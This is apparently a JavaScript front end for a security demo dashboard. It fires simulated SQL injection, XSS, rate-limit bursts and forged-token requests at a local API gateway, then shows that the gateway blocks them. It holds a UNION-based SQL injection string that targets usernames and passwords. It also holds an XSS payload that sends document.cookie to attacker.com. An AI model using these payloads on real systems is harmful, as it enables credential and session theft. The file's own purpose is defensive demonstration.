// Central Config Settings targeting our local edge gateway proxy routes
const GATEWAY_BASE_URL = 'http://localhost:8000/v1/mobile';
const MOCK_VALID_TOKEN = 'Bearer nexus_secure_token_abc123';
const MOCK_DEVICE_ID = 'dev_iphone16_nexus_alpha';

// Reference UI Interface nodes
const logFeedContainer = document.getElementById('log-feed-container');
const walletBalance = document.getElementById('wallet-balance');
const accountNumber = document.getElementById('acc-num');
const authCidDisplay = document.getElementById('auth-cid');
const hackerTerminal = document.getElementById('hacker-terminal');

// UI Automation Helper to render live structured telemetry entries
function pushTelemetryLog(status, message, correlationId = 'N/A') {
    // Clear initial listening string placeholder if it's there
    if (logFeedContainer.innerHTML.includes('[System Telemetry Framework Listening')) {
        logFeedContainer.innerHTML = '';
    }

    const logBlock = document.createElement('div');
    logBlock.className = `p-2 rounded border border-slate-800 text-[10px] font-mono leading-tight ${
        status === 'SUCCESS' ? 'bg-emerald-950/40 text-emerald-400 border-emerald-900/50' : 
        status === 'ATTACK' ? 'bg-red-950/60 text-red-400 border-red-900/60 animate-pulse' : 
        'bg-amber-950/40 text-amber-400 border-amber-900/50'
    }`;

    logBlock.innerHTML = `
        <div class="flex justify-between font-bold mb-0.5">
            <span>[${status}] ${new Date().toLocaleTimeString()}</span>
            <span class="text-slate-500">CID: ${correlationId.substring(0, 8)}...</span>
        </div>
        <div>${message}</div>
    `;
    
    logFeedContainer.prepend(logBlock);
}

// ==========================================
// ACTION 1: TRIGGER SECURE PROFILE REFRESH
// ==========================================
document.getElementById('btn-fetch-balance').addEventListener('click', async () => {
    hackerTerminal.innerText = "Simulating legitimate mobile client traffic verification handshake...";
    
    try {
        const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
            method: 'GET',
            headers: {
                'Authorization': MOCK_VALID_TOKEN,
                'X-Device-ID': MOCK_DEVICE_ID
            }
        });

        const jsonResult = await response.json();
        
        if (response.ok) {
            walletBalance.innerText = jsonResult.data.availableBalance;
            accountNumber.innerText = jsonResult.data.accountNumber;
            authCidDisplay.innerText = jsonResult.correlationId.substring(0, 8);
            hackerTerminal.innerText = "Secure Profile synchronization completed successfully.";
            pushTelemetryLog('SUCCESS', `200 OK - Profile fetched safely from inner backend microservice core data schemas.`, jsonResult.correlationId);
        } else {
            throw new Error(jsonResult.error || 'Gateway validation rejection');
        }
    } catch (err) {
        pushTelemetryLog('ERROR', `Fetch Interception Failure: ${err.message}`);
    }
});

// ==========================================
// ACTION 2: INJECT SQL INJECTION ATTACK VECTOR
// ==========================================
document.getElementById('btn-attack-sqli').addEventListener('click', async () => {
    hackerTerminal.innerText = "Injecting dangerous payload data properties: { query: 'UNION SELECT' }...";
    
    try {
        const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
            method: 'POST', // Switching method context to transport threat properties inside body
            headers: {
                'Authorization': MOCK_VALID_TOKEN,
                'X-Device-ID': MOCK_DEVICE_ID,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ injectionPayload: "admin' UNION SELECT username, password FROM users; --" })
        });

        const resData = await response.json();
        hackerTerminal.innerText = `Exploit dropped by gateway network interface layer with error message: ${resData.error}`;
        pushTelemetryLog('ATTACK', `400 BAD REQUEST - Deep payload threat inspection blocked SQL Injection string parameters!`, resData.cid);
    } catch (err) {
        console.error(err);
    }
});

// ==========================================
// ACTION 3: INJECT CROSS-SITE SCRIPTING EXPLOIT
// ==========================================
document.getElementById('btn-attack-xss').addEventListener('click', async () => {
    hackerTerminal.innerText = "Injecting volatile scripts: <script>maliciousXss()</script>...";
    
    try {
        const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
            method: 'POST',
            headers: {
                'Authorization': MOCK_VALID_TOKEN,
                'X-Device-ID': MOCK_DEVICE_ID,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ maliciousScript: "<script>window.location='http://attacker.com' + document.cookie</script>" })
        });

        const resData = await response.json();
        hackerTerminal.innerText = `Exploit dropped by gateway firewall checks with message context: ${resData.error}`;
        pushTelemetryLog('ATTACK', `400 BAD REQUEST - Deep payload threat inspection matched XSS script tag components!`, resData.cid);
    } catch (err) {
        console.error(err);
    }
});

// ==========================================
// ACTION 4: BURST ATTACK RATE LIMIT CONSTRAINTS
// ==========================================
document.getElementById('btn-attack-rate').addEventListener('click', async () => {
    hackerTerminal.innerText = "Launching automated high-frequency volumetric burst scripting sequences...";
    
    // Low loop to trip our Redis traffic monitor instantly
    for (let i = 1; i <= 15; i++) {
        setTimeout(async () => {
            try {
                const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
                    method: 'GET',
                    headers: {
                        'Authorization': MOCK_VALID_TOKEN,
                        'X-Device-ID': MOCK_DEVICE_ID
                    }
                });

                const resData = await response.json();
                
                if (response.status === 429) {
                    hackerTerminal.innerText = `Volumetric request script number ${i} was blocked explicitly: ${resData.error}`;
                    pushTelemetryLog('ATTACK', `429 TOO MANY REQUESTS - High speed traffic count tripped the Redis cache counter profile!`, resData.cid);
                } else {
                    pushTelemetryLog('SUCCESS', `Request execution count #${i} passed validation constraints successfully.`, resData.correlationId);
                }
            } catch (err) {
                console.error(err);
            }
        }, i * 150); // Small execution delay spacing to create realistic traffic streaming lookups
    }
});

// ==========================================
// ACTION 5: CRYPTOGRAPHIC AUTHENTICATION BYPASS
// ==========================================
document.getElementById('btn-attack-auth').addEventListener('click', async () => {
    hackerTerminal.innerText = "Transmitting corrupted authorization strings to test zero-trust validations...";
    
    try {
        const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
            method: 'GET',
            headers: {
                'Authorization': 'Bearer corrupted_token_signature_xyz_789',
                'X-Device-ID': MOCK_DEVICE_ID
            }
        });

        const resData = await response.json();
        hackerTerminal.innerText = `Gateway authentication layer dropped request with error parameters: ${resData.error}`;
        pushTelemetryLog('ERROR', `401 UNAUTHORIZED - Cryptographic check failed. Token signature validation failed.`, resData.cid);
    } catch (err) {
        console.error(err);
    }
});

// Clean the interface log feed tracking console array
document.getElementById('btn-clear-logs').addEventListener('click', () => {
    logFeedContainer.innerHTML = '<div class="text-slate-500 italic text-center pt-20">[Log screen wiped clean]</div>';
});
